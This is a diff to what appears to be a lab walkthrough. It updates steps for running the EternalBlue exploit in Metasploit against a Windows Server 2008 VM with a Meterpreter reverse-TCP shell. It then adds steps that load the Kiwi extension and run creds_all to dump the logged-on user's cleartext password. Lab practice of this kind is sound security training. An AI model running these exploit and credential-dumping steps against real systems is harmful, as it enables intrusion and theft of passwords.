@@ -280,7 +280,7 @@ exploit
 
 **On Win2008 VM**
 1. Login as Administrator
-2. On Metasploit, using the same EternalBlue exploit and RHOST (Win2), set the payload to the following:
+2. On Metasploit, using the same EternalBlue exploit and RHOST (Win2008 VM IP), set the payload to the following:
 ```
 windows/x64/meterpreter/reverse_tcp
 ```
@@ -291,4 +291,17 @@ set LHOST Kali-IP
 5. Run the exploit 
 ```
 exploit
+```
+6. At the Meterpreter prompt, type `getuid` to see which user account is running:
+7. Load the Kiwi extension:
+```
+use kiwi
+```
+8. View help manual from Kiwi
+```
+help kiwi
+```
+9. Get the cleartext password of the currently logged on user:
+```
+creds_all
 ```
